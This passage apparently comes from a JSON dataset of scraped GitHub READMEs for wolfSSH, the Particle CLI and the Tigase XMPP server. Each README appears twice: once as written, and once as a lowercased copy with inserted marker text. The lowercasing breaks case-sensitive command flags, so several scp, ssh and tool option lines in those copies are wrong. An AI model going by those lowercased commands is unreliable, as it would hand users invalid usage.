control characters will trigger special actions in the echoserver:\nCTRL-C: Terminate the connection.\nCTRL-E: Print out some session statistics.\nCTRL-F: Trigger a new key exchange.\ntesting notes\nAfter cloning the repository, be sure to make the testing private keys read- only for the user, otherwise ssh_client will tell you to do it.\n$ chmod 0600 ./keys/gretel-key-rsa.pem ./keys/hansel-key-rsa.pem \\\n./keys/gretel-key-ecc.pem ./keys/hansel-key-ecc.pem\nAuthentication against the example echoserver can be done with a password or public key. To use a password the command line:\n$ ssh_client -p 22222 USER@localhost\nWhere the USER and password pairs are:\njill:upthehill\njack:fetchapail\nTo use public key authentication use the command line:\n$ ssh_client -i ./keys/USER-key-TYPE.pem -p 22222 USER@localhost\nWhere the USER can be gretel or hansel, and TYPE is rsa or ecc.\nKeep in mind, the echoserver has several fake accounts in its wsUserAuth callback function. (jack, jill, hansel, and gretel) When the shell support is enabled, those fake accounts will not work. They don't exist in the system's passwd file. The users will authenticate, but the server will err out because they don't exist in the system. You can add your own username to the password or public key list in the echoserver. That account will be logged into a shell started by the echoserver with the privileges of the user running echoserver.\nEXAMPLES\nwolfSSH comes packaged with a few example tools for testing purposes and to demonstrate interoperability with other SSH implementations.\nechoserver\nThe echoserver is the workhorse of wolfSSH. It originally only allowed one to authenticate one of the canned account and would repeat the characters typed into it. When enabling shell support, see the later section, it can spawn a user shell. It will need an actual user name on the machine and an updated user authentication callback function to validate the credentials. The echoserver can also handle SCP and SFTP connections.\nThe echoserver tool accepts the following command line options:\n-1 exit after a single (one) connection\n-e expect ECC public key from client\n-E use ECC private key\n-f echo input\n-p <num> port to accept on, default 22222\n-N use non-blocking sockets\n-d <string> set the home directory for SFTP connections\n-j <file> load in a public key to accept from peer\nclient\nThe client establishes a connection to an SSH server. In its simplest mode, it sends the string \"Hello, wolfSSH!\" to the server, prints the response, and then exits. With the pseudo terminal option, the client will be a real client.\nThe client tool accepts the following command line options:\n-h <host> host to connect to, default 127.0.0.1\n-p <num> port to connect on, default 22222\n-u <username> username to authenticate as (REQUIRED)\n-P <password> password for username, prompted if omitted\n-e use sample ecc key for user\n-i <filename> filename for the user's private key\n-j <filename> filename for the user's public key\n-x exit after successful connection without doing\nread/write\n-N use non-blocking sockets\n-t use psuedo terminal\n-c <command> executes remote command and pipe stdin/stdout\n-a Attempt to use SSH-AGENT\nportfwd\nThe portfwd tool establishes a connection to an SSH server and sets up a listener for local port forwarding or requests a listener for remote port forwarding. After a connection, the tool terminates.\nThe portfwd tool accepts the following command line options:\n-h <host> host to connect to, default 127.0.0.1\n-p <num> port to connect on, default 22222\n-u <username> username to authenticate as (REQUIRED)\n-P <password> password for username, prompted if omitted\n-F <host> host to forward from, default 0.0.0.0\n-f <num> host port to forward from (REQUIRED)\n-T <host> host to forward to, default to host\n-t <num> port to forward to (REQUIRED)\nscpclient\nThe scpclient, wolfscp, establishes a connection to an SSH server and copies the specified files from or to the local machine.\nThe scpclient tool accepts the following command line options:\n-H <host> host to connect to, default 127.0.0.1\n-p <num> port to connect on, default 22222\n-u <username> username to authenticate as (REQUIRED)\n-P <password> password for username, prompted if omitted\n-L <from>:<to> copy from local to server\n-S <from>:<to> copy from server to local\nsftpclient\nThe sftpclient, wolfsftp, establishes a connection to an SSH server and allows directory navigation, getting and putting files, making and removing directories, etc.\nThe sftpclient tool accepts the following command line options:\n-h <host> host to connect to, default 127.0.0.1\n-p <num> port to connect on, default 22222\n-u <username> username to authenticate as (REQUIRED)\n-P <password> password for username, prompted if omitted\n-d <path> set the default local path\n-N use non blocking sockets\n-e use ECC user authentication\n-l <filename> local filename\n-r <filename> remote filename\n-g put local filename as remote filename\n-G get remote filename as local filename\nserver\nThis tool is a place holder.\nSCP\nwolfSSH includes server-side support for scp, which includes support for both copying files 'to' the server, and copying files 'from' the server. Both single file and recursive directory copy are supported with the default send and receive callbacks.\nTo compile wolfSSH with scp support, use the --enable-scp build option or define WOLFSSL_SCP:\n$ ./configure --enable-scp\n$ make\nFor full API usage and implementation details, please see the wolfSSH User Manual.\nThe wolfSSL example server has been set up to accept a single scp request, and is compiled by default when compiling the wolfSSH library. To start the example server, run:\n$ ./examples/server/server\nStandard scp commands can be used on the client side. The following are a few examples, where scp represents the ssh client you are using.\nTo copy a single file TO the server, using the default example user \"jill\":\n$ scp -P 22222 <local_file> jill@127.0.0.1:<remote_path>\nTo copy the same single file TO the server, but with timestamp and in verbose mode:\n$ scp -v -p -P 22222 <local_file> jill@127.0.0.1:<remote_path>\nTo recursively copy a directory TO the server:\n$ scp -P 22222 -r <local_dir> jill@127.0.0.1:<remote_dir>\nTo copy a single file FROM the server to the local client:\n$ scp -P 22222 jill@127.0.0.1:<remote_file> <local_path>\nTo recursively copy a directory FROM the server to the local client:\n$ scp -P 22222 -r jill@127.0.0.1:<remote_dir> <local_path>\nPORT FORWARDING\nwolfSSH provides support for port forwarding. This allows the user to set up an encrypted tunnel to another server, where the SSH client listens on a socket and forwards connections on that socket to another socket on the server.\nTo compile wolfSSH with port forwarding support, use the --enable-fwd build option or define WOLFSSH_FWD:\n$ ./configure --enable-fwd\n$ make\nFor full API usage and implementation details, please see the wolfSSH User Manual.\nThe portfwd example tool will create a \"direct-tcpip\" style channel. These directions assume you have OpenSSH's server running in the background with port forwarding enabled. This example forwards the port for the wolfSSL client to the server as the application. It assumes that all programs are run on the same machine in different terminals.\nsrc/wolfssl$ ./examples/server/server\nsrc/wolfssh$ ./examples/portfwd/portfwd -p 22 -u <username> \\\n-f 12345 -t 11111\nsrc/wolfssl$ ./examples/client/client -p 12345\nBy default, the wolfSSL server listens on port 11111. The client is set to try to connect to port 12345. The portfwd logs in as user \"username\", opens a listener on port 12345 and connects to the server on port 11111. Packets are routed back and forth between the client and server. \"Hello, wolfSSL!\"\nThe source for portfwd provides an example on how to set up and use the port forwarding support in wolfSSH.\nThe echoserver will handle local and remote port forwarding. To connect with the ssh tool, using one of the following command lines. You can run either of the ssh command lines from anywhere:\nsrc/wolfssl$ ./examples/server/server\nsrc/wolfssh$ ./examples/echoserver/echoserver\nanywhere 1$ ssh -p 22222 -L 12345:localhost:11111 jill@localhost\nanywhere 2$ ssh -p 22222 -R 12345:localhost:11111 jill@localhost\nsrc/wolfssl$ ./examples/client/client -p 12345\nThis will allow port forwarding between the wolfSSL client and server like in the previous example.\nSFTP\nwolfSSH provides server and client side support for SFTP version 3. This allows the user to set up an encrypted connection for managing file systems.\nTo compile wolfSSH with SFTP support, use the --enable-sftp build option or define WOLFSSH_SFTP:\n$ ./configure --enable-sftp\n$ make\nFor full API usage and implementation details, please see the wolfSSH User Manual.\nThe SFTP client created is located in the directory examples/sftpclient/ and the server is ran using the same echoserver as with wolfSSH.\nsrc/wolfssh$ ./examples/sftpclient/wolfsftp\nA full list of supported commands can be seen with typeing \"help\" after a connection.\nwolfSSH sftp> help\nCommands :\ncd <string> change directory\nchmod <mode> <path> change mode\nget <remote file> <local file> pulls file(s) from server\nls list current directory\nmkdir <dir name> creates new directory on server\nput <local file> <remote file> push file(s) to server\npwd list current path\nquit exit\nrename <old> <new> renames remote file\nreget <remote file> <local file> resume pulling file\nreput <remote file> <local file> resume pushing file\n<crtl + c> interrupt get/put cmd\nAn example of connecting to another system would be\nsrc/wolfssh$ ./examples/sftpclient/wolfsftp -p 22 -u user -h 192.168.1.111\nSHELL SUPPORT\nwolfSSH's example echoserver can now fork a shell for the user trying to log in. This currently has only been tested on Linux and macOS. The file echoserver.c must be modified to have the user's credentials in the user authentication callback, or the user authentication callback needs to be changed to verify the provided password.\nTo compile wolfSSH with shell support, use the --enable-shell build option or define WOLFSSH_SHELL:\n$ ./configure --enable-shell\n$ make\nBy default, the echoserver will try to start a shell. To use the echo testing behavior, give the echoserver the command line option -f.\n$ ./examples/echoserver/echoserver -f", "link": "https://github.com/wolfSSL/wolfssh", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "wolfssh\nwolfssl's embeddable ssh server wolfssh manual\ndependencies\nwolfssh is dependent on wolfcrypt. the simplest configuration of wolfssl required for wolfssh is the default build.\n$ cd wolfssl\n$ ./configure [options] --enable-ssh\n$ make check\n$ sudo make install\non some systems the optional ldconfig command is needed after installing.\nto use the key generation function in wolfssh, wolfssl will need to be configured with keygen: --enable-keygen.\nif the bulk of wolfssl code isn't desired, wolfssl can be configured with the crypto only option: --enable-cryptonly.\nadditional build options for wolfssl are located here.\nbuilding\nfrom the wolfssh source directory run:\n$ ./autogen.sh\n$ ./configure\n$ make\n$ make check\nthe autogen.sh script only has to be run the first time after cloning the repository. if you have already run it or are using code from a source archive, you should skip it.\nfor building under windows with visual studio, see the file \"ide/winvs/readme.md\".\nnote: on resource constrained devices the default_window_sz may need to be set to a lower size. it can also be increased in desktop use cases to help with large file transfers. by default channels are set to handle 16,384 bytes of data being sent and received. an example of setting a window size for new channels would be as follows \"./configure cppflags=-ddefault_window_sz=16384\"\nexamples\nthe directory examples contains an echoserver that any client should be able to connect to. from the terminal run:\n$ ./examples/echoserver/echoserver -f\nthe option -f enables echo-only mode. from another terminal run:\n$ ssh_client jill@localhost -p 22222\nwhen prompted for a password, enter \"upthehill\". the server will send a canned banner to the client:\nwolfssh example echo server\ncharacters typed into the client will be echoed to the screen by the server. if the characters are echoed twice, the client has local echo enabled. the echo server isn't being a proper terminal so the cr/lf translation will not work as expected.\nthe following control characters will trigger special actions in the echoserver:\nctrl-c: terminate the connection.\nctrl-e: print out some session statistics.\nctrl-f: trigger a new key exchange.\ntesting notes\nafter cloning the repository, be sure to make the testing private keys read- only for the user, otherwise ssh_client will tell you to do it.\n$ chmod 0600 ./keys/gretel-key-rsa.pem ./keys/hansel-key-rsa.pem \\\n./keys/gretel-key-ecc.pem ./keys/hansel-key-ecc.pem\nauthentication against the example echoserver can be done with a password or public key. to use a password the command line:\n$ ssh_client -p 22222 user@localhost\nwhere the user and password pairs are:\njill:upthehill\njack:fetchapail\nto use public key authentication use the command line:\n$ ssh_client -i ./keys/user-key-type.pem -p 22222 user@localhost\nwhere the user can be gretel or hansel, and type is rsa or ecc.\nkeep in mind, the echoserver has several fake accounts in its wsuserauth callback function. (jack, jill, hansel, and gretel) when the shell support is enabled, those fake accounts will not work. they don't exist in the system's passwd file. the users will authenticate, but the server will err out because they don't exist in the system. you can add your own username to the password or public key list in the echoserver. that account will be logged into a shell started by the echoserver with the privileges of the user running echoserver.\nexamples\nwolfssh comes packaged with a few example tools for testing purposes and to demonstrate interoperability with other ssh implementations.\nechoserver\nthe echoserver is the workhorse of wolfssh. it originally only allowed one to authenticate one of the canned account and would repeat the characters typed into it. when enabling shell support, see the later section, it can spawn a user shell. it will need an actual user name on the machine and an updated user authentication callback function to validate the credentials. the echoserver can also handle scp and sftp connections.\nthe echoserver -----> tool !!!  accepts the following command line options:\n-1 exit after a single (one) connection\n-e expect ecc public key from client\n-e use ecc private key\n-f echo input\n-p <num> port to accept on, default 22222\n-n use non-blocking sockets\n-d <string> set the home directory for sftp connections\n-j <file> load in a public key to accept from peer\nclient\nthe client establishes a connection to an ssh server. in its simplest mode, it sends the string \"hello, wolfssh!\" to the server, prints the response, and then exits. with the pseudo terminal option, the client will be a real client.\nthe client tool accepts the following command line options:\n-h <host> host to connect to, default 127.0.0.1\n-p <num> port to connect on, default 22222\n-u <username> username to authenticate as (required)\n-p <password> password for username, prompted if omitted\n-e use sample ecc key for user\n-i <filename> filename for the user's private key\n-j <filename> filename for the user's public key\n-x exit after successful connection without doing\nread/write\n-n use non-blocking sockets\n-t use psuedo terminal\n-c <command> executes remote command and pipe stdin/stdout\n-a attempt to use ssh-agent\nportfwd\nthe portfwd tool establishes a connection to an ssh server and sets up a listener for local port forwarding or requests a listener for remote port forwarding. after a connection, the tool terminates.\nthe portfwd tool accepts the following command line options:\n-h <host> host to connect to, default 127.0.0.1\n-p <num> port to connect on, default 22222\n-u <username> username to authenticate as (required)\n-p <password> password for username, prompted if omitted\n-f <host> host to forward from, default 0.0.0.0\n-f <num> host port to forward from (required)\n-t <host> host to forward to, default to host\n-t <num> port to forward to (required)\nscpclient\nthe scpclient, wolfscp, establishes a connection to an ssh server and copies the specified files from or to the local machine.\nthe scpclient tool accepts the following command line options:\n-h <host> host to connect to, default 127.0.0.1\n-p <num> port to connect on, default 22222\n-u <username> username to authenticate as (required)\n-p <password> password for username, prompted if omitted\n-l <from>:<to> copy from local to server\n-s <from>:<to> copy from server to local\nsftpclient\nthe sftpclient, wolfsftp, establishes a connection to an ssh server and allows directory navigation, getting and putting files, making and removing directories, etc.\nthe sftpclient tool accepts the following command line options:\n-h <host> host to connect to, default 127.0.0.1\n-p <num> port to connect on, default 22222\n-u <username> username to authenticate as (required)\n-p <password> password for username, prompted if omitted\n-d <path> set the default local path\n-n use non blocking sockets\n-e use ecc user authentication\n-l <filename> local filename\n-r <filename> remote filename\n-g put local filename as remote filename\n-g get remote filename as local filename\nserver\nthis tool is a place holder.\nscp\nwolfssh includes server-side support for scp, which includes support for both copying files 'to' the server, and copying files 'from' the server. both single file and recursive directory copy are supported with the default send and receive callbacks.\nto compile wolfssh with scp support, use the --enable-scp build option or define wolfssl_scp:\n$ ./configure --enable-scp\n$ make\nfor full api usage and implementation details, please see the wolfssh user manual.\nthe wolfssl example server has been set up to accept a single scp request, and is compiled by default when compiling the wolfssh library. to start the example server, run:\n$ ./examples/server/server\nstandard scp commands can be used on the client side. the following are a few examples, where scp represents the ssh client you are using.\nto copy a single file to the server, using the default example user \"jill\":\n$ scp -p 22222 <local_file> jill@127.0.0.1:<remote_path>\nto copy the same single file to the server, but with timestamp and in verbose mode:\n$ scp -v -p -p 22222 <local_file> jill@127.0.0.1:<remote_path>\nto recursively copy a directory to the server:\n$ scp -p 22222 -r <local_dir> jill@127.0.0.1:<remote_dir>\nto copy a single file from the server to the local client:\n$ scp -p 22222 jill@127.0.0.1:<remote_file> <local_path>\nto recursively copy a directory from the server to the local client:\n$ scp -p 22222 -r jill@127.0.0.1:<remote_dir> <local_path>\nport forwarding\nwolfssh provides support for port forwarding. this allows the user to set up an encrypted tunnel to another server, where the ssh client listens on a socket and forwards connections on that socket to another socket on the server.\nto compile wolfssh with port forwarding support, use the --enable-fwd build option or define wolfssh_fwd:\n$ ./configure --enable-fwd\n$ make\nfor full api usage and implementation details, please see the wolfssh user manual.\nthe portfwd example tool will create a \"direct-tcpip\" style channel. these directions assume you have openssh's server running in the background with port forwarding enabled. this example forwards the port for the wolfssl client to the server as the application. it assumes that all programs are run on the same machine in different terminals.\nsrc/wolfssl$ ./examples/server/server\nsrc/wolfssh$ ./examples/portfwd/portfwd -p 22 -u <username> \\\n-f 12345 -t 11111\nsrc/wolfssl$ ./examples/client/client -p 12345\nby default, the wolfssl server listens on port 11111. the client is set to try to connect to port 12345. the portfwd logs in as user \"username\", opens a listener on port 12345 and connects to the server on port 11111. packets are routed back and forth between the client and server. \"hello, wolfssl!\"\nthe source for portfwd provides an example on how to set up and use the port forwarding support in wolfssh.\nthe echoserver will handle local and remote port forwarding. to connect with the ssh tool, using one of the following command lines. you can run either of the ssh command lines from anywhere:\nsrc/wolfssl$ ./examples/server/server\nsrc/wolfssh$ ./examples/echoserver/echoserver\nanywhere 1$ ssh -p 22222 -l 12345:localhost:11111 jill@localhost\nanywhere 2$ ssh -p 22222 -r 12345:localhost:11111 jill@localhost\nsrc/wolfssl$ ./examples/client/client -p 12345\nthis will allow port forwarding between the wolfssl client and server like in the previous example.\nsftp\nwolfssh provides server and client side support for sftp version 3. this allows the user to set up an encrypted connection for managing file systems.\nto compile wolfssh with sftp support, use the --enable-sftp build option or define wolfssh_sftp:\n$ ./configure --enable-sftp\n$ make\nfor full api usage and implementation details, please see the wolfssh user manual.\nthe sftp client created is located in the directory examples/sftpclient/ and the server is ran using the same echoserver as with wolfssh.\nsrc/wolfssh$ ./examples/sftpclient/wolfsftp\na full list of supported commands can be seen with typeing \"help\" after a connection.\nwolfssh sftp> help\ncommands :\ncd <string> change directory\nchmod <mode> <path> change mode\nget <remote file> <local file> pulls file(s) from server\nls list current directory\nmkdir <dir name> creates new directory on server\nput <local file> <remote file> push file(s) to server\npwd list current path\nquit exit\nrename <old> <new> renames remote file\nreget <remote file> <local file> resume pulling file\nreput <remote file> <local file> resume pushing file\n<crtl + c> interrupt get/put cmd\nan example of connecting to another system would be\nsrc/wolfssh$ ./examples/sftpclient/wolfsftp -p 22 -u user -h 192.168.1.111\nshell support\nwolfssh's example echoserver can now fork a shell for the user trying to log in. this currently has only been tested on linux and macos. the file echoserver.c must be modified to have the user's credentials in the user authentication callback, or the user authentication callback needs to be changed to verify the provided password.\nto compile wolfssh with shell support, use the --enable-shell build option or define wolfssh_shell:\n$ ./configure --enable-shell\n$ make\nby default, the echoserver will try to start a shell. to use the echo testing behavior, give the echoserver the command line option -f.\n$ ./examples/echoserver/echoserver -f", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000329, "year": null}, {"Unnamed: 0": 331, "autor": 331, "date": null, "content": "Particle's full-stack Internet of Things (IoT) device platform gives you everything you need to securely and reliably connect your IoT devices to the web. For more details please visit www.particle.io.\nParticle CLI\nThe Particle CLI is a powerful tool for interacting with your IoT devices and the Particle Cloud. The CLI uses node.js and can run on Windows, Mac OS X, and Linux. It's also open source so you can edit and change it, and even send in your changes as pull requests if you want to share!\nTable of Contents\nInstalling\nGetting Started\nparticle setup\nparticle help\nUpdating Firmware\nPhoton/P1/Electron\nparticle update\nCommand Reference\nKnown Issues\nDevelopment\nInstalling\nRunning\nTesting\nUpdating system firmware\nReleasing a new version\nInstalling\nFor end-users, the most up-to-date installation instructions can be found here: macOS / Linux | Windows\nNote: On some platforms (e.g. arm), additional manual steps are required:\nparticle-cli uses npm packages node-usb and node-serialport. On some environments (ie: Raspberry Pi and Apple M1), node-serialport does not provide prebuild environments, so their npm install script relies on creating a prebuild using node-gyp (See node-gyp requirements), and libudev (See node-usb installation. And these must be installed in order for their npm install script to succeed. As well, particle-cli uses dfu-util and openssl.\nAs an example, to install these dependencies on Raspbian/Debian/Ubuntu:\nsudo apt update && sudo apt upgrade\nsudo apt install build-essential libudev-dev python3 dfu-util openssl\nGetting Started\nThese next two commands are all you need to get started setting up an account, claiming a device, and discovering new features.\nparticle setup\nGuides you through creating a new account, and claiming your device!\n$ particle setup\nparticle help\nShows you what commands are available, and how to use them. You can also give the name of a command for detailed help.\n$ particle help\n$ particle help keys\nUpdating Firmware\nPhoton/P1/Electron\nparticle update\nIf you wish to easily update the system firmware running on your device to a later version, you can use the particle update command. For the exact version it will update to, check the version of the files in the updates folder.\nMake sure you have DFU-util installed.\nConnect your device via USB, and put it into DFU mode.\nRun particle update.\nCommand Reference\nFor the full list of commands, please see the CLI command reference.\nKnown Issues\nThe Wireless Photon Setup Wizard will only automatically switch networks on OS X. Users of other operating systems will need to manually connect their computer to the Photon's Wi-Fi. You will be prompted during the wizard when this is required.\nDevelopment\nCurrently development is supported on macOS only!\nInstalling\nInstall Node.js [node@12.x and npm@6.x are required]\nClone this repository $ git clone git@github.com:particle-iot/particle-cli.git && cd ./particle-cli\nInstall external tools: dfu-util and openssl (e.g. brew install openssl)\nInstall dependencies $ npm install\nView available commands $ npm run\nRun the tests $ npm test\nRun the CLI $ npm start\nStart Hacking!\nRunning\nTo ensure compatibility with a wide range of NodeJS versions, the CLI's source is transpiled using Babel.\nWhen developing, run individual commands using:\n$ npm start -- <command> <options> - e.g. $ npm start -- library view dotstar --readme\nAnything after the -- delimiter is passed directly to the CLI (docs), source code is transpiled on-demand.\nTo test the transpiled source as it will be published:\nCompile: $ npm run compile\nRegister the particle command globally: $ npm link\nRun commands: $ particle --help (using standard argument formatting)\nTesting\nThe Particle CLI has a number of automated test suites and related commands. The most important are:\nnpm test - run all tests (NOTE: End-To-End tests require additional setup)\nnpm run lint - run the linter and print any errors to your terminal\nnpm run test:ci - run all tests excluding device-dependent end-to-end test as CI does\nnpm run test:unit - run unit tests\nnpm run test:integration - run integration tests\nnpm run coverage - report code coverage stats\nAll tests use mocha, chai, and sinon with coverage handled by nyc.\nWe recommend running locally if you can as it greatly shortens your feedback loop. However, CI also runs against every PR and error reporting is publicly available.\nUpdating system firmware\nnpm run update-firmware-binaries <version> where <version> is the newly released system firmware version like 0.7.0\nTest on each platform by doing\n# Check old firmware version\nbin/particle.js serial inspect\n# Flash new system firmware\nbin/particle.js update\n# Verify new firmware version\nbin/particle.js serial inspect\nDo not update the versions or CHANGELOG.md just yet!\nCommit as something like \"adds firmware binaries for 0.7.0\" and proceed to release a new CLI version (below).\nReleasing a new version\nSee RELEASE.md.", "link": "https://github.com/particle-iot/particle-cli", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "particle's full-stack internet of things (iot) device platform gives you everything you need to securely and reliably connect your iot devices to the web. for more details please visit www.particle.io.\nparticle cli\nthe particle cli is a powerful -----> tool !!!  for interacting with your iot devices and the particle cloud. the cli uses node.js and can run on windows, mac os x, and linux. it's also open source so you can edit and change it, and even send in your changes as pull requests if you want to share!\ntable of contents\ninstalling\ngetting started\nparticle setup\nparticle help\nupdating firmware\nphoton/p1/electron\nparticle update\ncommand reference\nknown issues\ndevelopment\ninstalling\nrunning\ntesting\nupdating system firmware\nreleasing a new version\ninstalling\nfor end-users, the most up-to-date installation instructions can be found here: macos / linux | windows\nnote: on some platforms (e.g. arm), additional manual steps are required:\nparticle-cli uses npm packages node-usb and node-serialport. on some environments (ie: raspberry pi and apple m1), node-serialport does not provide prebuild environments, so their npm install script relies on creating a prebuild using node-gyp (see node-gyp requirements), and libudev (see node-usb installation. and these must be installed in order for their npm install script to succeed. as well, particle-cli uses dfu-util and openssl.\nas an example, to install these dependencies on raspbian/debian/ubuntu:\nsudo apt update && sudo apt upgrade\nsudo apt install build-essential libudev-dev python3 dfu-util openssl\ngetting started\nthese next two commands are all you need to get started setting up an account, claiming a device, and discovering new features.\nparticle setup\nguides you through creating a new account, and claiming your device!\n$ particle setup\nparticle help\nshows you what commands are available, and how to use them. you can also give the name of a command for detailed help.\n$ particle help\n$ particle help keys\nupdating firmware\nphoton/p1/electron\nparticle update\nif you wish to easily update the system firmware running on your device to a later version, you can use the particle update command. for the exact version it will update to, check the version of the files in the updates folder.\nmake sure you have dfu-util installed.\nconnect your device via usb, and put it into dfu mode.\nrun particle update.\ncommand reference\nfor the full list of commands, please see the cli command reference.\nknown issues\nthe wireless photon setup wizard will only automatically switch networks on os x. users of other operating systems will need to manually connect their computer to the photon's wi-fi. you will be prompted during the wizard when this is required.\ndevelopment\ncurrently development is supported on macos only!\ninstalling\ninstall node.js [node@12.x and npm@6.x are required]\nclone this repository $ git clone git@github.com:particle-iot/particle-cli.git && cd ./particle-cli\ninstall external tools: dfu-util and openssl (e.g. brew install openssl)\ninstall dependencies $ npm install\nview available commands $ npm run\nrun the tests $ npm test\nrun the cli $ npm start\nstart hacking!\nrunning\nto ensure compatibility with a wide range of nodejs versions, the cli's source is transpiled using babel.\nwhen developing, run individual commands using:\n$ npm start -- <command> <options> - e.g. $ npm start -- library view dotstar --readme\nanything after the -- delimiter is passed directly to the cli (docs), source code is transpiled on-demand.\nto test the transpiled source as it will be published:\ncompile: $ npm run compile\nregister the particle command globally: $ npm link\nrun commands: $ particle --help (using standard argument formatting)\ntesting\nthe particle cli has a number of automated test suites and related commands. the most important are:\nnpm test - run all tests (note: end-to-end tests require additional setup)\nnpm run lint - run the linter and print any errors to your terminal\nnpm run test:ci - run all tests excluding device-dependent end-to-end test as ci does\nnpm run test:unit - run unit tests\nnpm run test:integration - run integration tests\nnpm run coverage - report code coverage stats\nall tests use mocha, chai, and sinon with coverage handled by nyc.\nwe recommend running locally if you can as it greatly shortens your feedback loop. however, ci also runs against every pr and error reporting is publicly available.\nupdating system firmware\nnpm run update-firmware-binaries <version> where <version> is the newly released system firmware version like 0.7.0\ntest on each platform by doing\n# check old firmware version\nbin/particle.js serial inspect\n# flash new system firmware\nbin/particle.js update\n# verify new firmware version\nbin/particle.js serial inspect\ndo not update the versions or changelog.md just yet!\ncommit as something like \"adds firmware binaries for 0.7.0\" and proceed to release a new cli version (below).\nreleasing a new version\nsee release.md.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000331, "year": null}, {"Unnamed: 0": 332, "autor": 332, "date": null, "content": "Highly optimized, extremely modular and very flexible XMPP/Jabber server\nWhat it is\nTigase XMPP Server is highly optimized, extremely modular and very flexible XMPP/Jabber server written in Java.\nThis repository contains source code of the main part of the Tigase XMPP Server.\nThe project exists since 2004 and we have recently moved it over to GitHub.\nOther Tigase projects related to XMPP:\nTigase XMPP Server addons:\nMUC Component - Multi-User Chat: XEP-0045\nPubSub Component - Publish-Subscribe: XEP-0060 and Personal Eventing Protocol: XEP-0163\nSocks5 Proxy Component - SOCKS5 Bytestreams: XEP-0065\nSTUN Component - STUN Component for Tigase\nHTTP API Component - Component providing easy to use HTTP endpoints for server management and integration based on JDK built-in HTTP server.\nJetty HTTP API Component - High performance and high load component providing easy to use HTTP endpoints for server management and integration based on Jetty HTTP Server.\nMongoDB Connector - Connector adding support for MongoDB database to Tigase server.\nMessage Archiving Component - Component providing Message Archiving XEP-0136 and Message Archive Management XEP-0313 support.\nTools:\nDatabase Migrator Tool - Tools helping with migration from other XMPP servers to Tigase based system.\nTTS-NG Test Suite - Test Suite to run automated tests for the Tigase XMPP Server\nTigase Monitor Console - Stand-alone application for the Tigase XMPP Server monitoring and management console.\nAtom DSL Syntax - Atom DSL syntex highlighter for Tigase XMPP Server configuration files.\nIntelliJ IDEA DSL Syntax - IntelliJ IDEA IDE DSL syntex highlighter for Tigase XMPP Server configuration files.\nTigase XMPP Clients:\nStorkIM Client - Android XMPP Client\nSiskinIM Client - iOS XMPP Client\nBeagleIM Client - MacOS XMPP Client\nSwift Library - Tigase Swift XMPP Library\nSwift OMEMO Plugin - OMEMO support for Tigase Swift XMPP library\nTigase based IoT:\nTigase IoT Framework - Easy to use IoT framework to communicate and control Iot devices over XMPP\nTigase IoT Framework - Examples - Examples on how to extend the Tigase IoT Framework with support for different devices\nTigase RPi Library - Java low-level library to control sensors and devices connected to RasperryPi.\nFeatures\nTigase XMPP Server contains full support for RFC 6120 - XMPP CORE, RFC 6121 - XMPP IM and RFC 7395 - XMPP over WebSockets making it accessible using XMPP client connections:\nover TCP\nover HTTP/HTTPS (BOSH)\nover WebSockets\nand over server-to-server connections as well as over XMPP component connections.\nAdditionally Tigase XMPP Server provides HTTP API for integration with other services unable to communicate over XMPP.\nMoveover, Tigase XMPP Server comes with support for Push Notifications making it possible to push notification to mobile devices.\nFollowing features are supported by Tigase XMPP Server:\nXEP-0016: Flexible Offline Message Retrieval\nXEP-0030: Service Discovery\nXEP-0045: Multi User Chat\nXEP-0060: Publish-Subscribe\nXEP-0079: Advanced Message Processing\nXEP-0114: Jabber Component Protocol\nXEP-0115: Entity Capabilities\nXEP-0133: Service Administration\nXEP-0136: Message Archiving\nXEP-0163: Personal Eventing Protocol\nXEP-0198: Stream Management\nXEP-0199: XMPP Ping\nXEP-0206: XMPP over BOSH\nXEP-0225: Component Connections\nXEP-0237: Roster Versioning\nXEP-0280: Message Carbons\nXEP-0313: Message Archive Management\nXEP-0357: Push Notifications\nXEP-0363: HTTP File Upload\nand many more...\nSupport\nWhen looking for support, please first search for answers to your question in the available online channels:\nOur online documentation: Tigase Docs\nExisting issues in relevant project, for Tigase Server it's: Tigase XMPP Server GitHub issues\nIf you didn't find an answer in the resources above, feel free to submit your question as new issue on GitHub or, if you have valid support subscription, open new support ticket.\nDownloads\nYou can download distribution version of the Tigase XMPP Server directly from here.\nIf you wish to downloand SNAPSHOT build of the development version of Tigase XMPP Server you can grab it from here.\nInstallation and usage\nDocumentation of the project is part of the Tigase XMPP Server distribution package. Quickstart guide is also available here.\nCompilation\nCompilation of the project is very easy as it is typical Maven project. All you need to do is to execute\nmvn package test\nto compile the project and run unit tests.\nLicense\nOfficial Tigase repository is available at: https://github.com/tigase/tigase-server/.\nCopyright (c) 2004 Tigase, Inc.\nLicensed under AGPL License Version 3. Other licensing options available upon request.", "link": "https://github.com/tigase/tigase-server", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "highly optimized, extremely modular and very flexible xmpp/jabber server\nwhat it is\ntigase xmpp server is highly optimized, extremely modular and very flexible xmpp/jabber server written in java.\nthis repository contains source code of the main part of the tigase xmpp server.\nthe project exists since 2004 and we have recently moved it over to github.\nother tigase projects related to xmpp:\ntigase xmpp server addons:\nmuc component - multi-user chat: xep-0045\npubsub component - publish-subscribe: xep-0060 and personal eventing protocol: xep-0163\nsocks5 proxy component - socks5 bytestreams: xep-0065\nstun component - stun component for tigase\nhttp api component - component providing easy to use http endpoints for server management and integration based on jdk built-in http server.\njetty http api component - high performance and high load component providing easy to use http endpoints for server management and integration based on jetty http server.\nmongodb connector - connector adding support for mongodb database to tigase server.\nmessage archiving component - component providing message archiving xep-0136 and message archive management xep-0313 support.\ntools:\ndatabase migrator -----> tool !!!  - tools helping with migration from other xmpp servers to tigase based system.\ntts-ng test suite - test suite to run automated tests for the tigase xmpp server\ntigase monitor console - stand-alone application for the tigase xmpp server monitoring and management console.\natom dsl syntax - atom dsl syntex highlighter for tigase xmpp server configuration files.\nintellij idea dsl syntax - intellij idea ide dsl syntex highlighter for tigase xmpp server configuration files.\ntigase xmpp clients:\nstorkim client - android xmpp client\nsiskinim client - ios xmpp client\nbeagleim client - macos xmpp client\nswift library - tigase swift xmpp library\nswift omemo plugin - omemo support for tigase swift xmpp library\ntigase based iot:\ntigase iot framework - easy 